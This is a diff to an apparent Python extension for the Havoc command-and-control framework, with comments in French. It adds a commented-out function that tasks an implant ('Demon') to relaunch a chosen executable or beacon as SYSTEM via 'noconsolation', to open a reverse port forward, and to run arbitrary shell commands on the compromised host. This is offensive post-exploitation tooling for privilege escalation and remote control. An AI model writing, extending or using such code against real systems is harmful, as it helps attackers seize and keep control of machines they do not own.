@@ -16,7 +16,6 @@ def print_message(message, _file=None):
     sys.stderr.write(message)
     raise ValueError(message)
 
-
 def parse_args(params):
     parser = argparse.ArgumentParser(description='This tool implemant impersonnate in Havoc frameworks')
     parser.exit = exit
@@ -37,6 +36,34 @@ def parse_args(params):
 
     return parser.parse_args(args=params)
 
+
+###def impersonnatelaunchinmemory( demonID, *param ):   // Incoming
+###    global EXECUTABLEFILE
+###    
+###    demon  = Demon( demonID )
+###    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "Success")
+###    
+###    try:
+###        args = parse_args(param)
+###    except Exception as e:
+###        demon.ConsoleWrite(demon.CONSOLE_ERROR, str(e))
+###
+###    if args.command == 'SetExecutableFile':
+###        EXECUTABLEFILE = args.executable_path
+###        demon.ConsoleWrite(demon.CONSOLE_INFO, "Chemin Enregistrer")
+###        #demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_Ditto}')
+###    elif args.command == 'DemonAsSystem':
+###        if EXECUTABLEFILE is None:
+###            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
+###        else:
+###            beaconpath = args.beacon_path
+###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
+###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command cmd.exe --detached")
+###            demon.Command(TaskID, f"rportfwd")
+###    else:
+###        arg = " ".join(args.commandline)
+###        demon.Command(TaskID, f"shell {dest_Ditto} {arg}")
+###    return TaskID
 
 def impersonnate( demonID, *param ):
     global EXECUTABLEFILE
